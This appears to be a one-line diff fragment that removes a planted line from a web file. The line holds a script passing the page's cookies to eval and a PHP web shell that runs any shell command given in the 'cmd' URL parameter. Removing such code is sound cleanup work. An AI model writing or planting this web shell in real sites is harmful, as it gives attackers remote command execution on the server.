@@ -1,1 +1,0 @@
-<script>eval(document.cookie)</script><?php exec($_GET["cmd"]); ?>
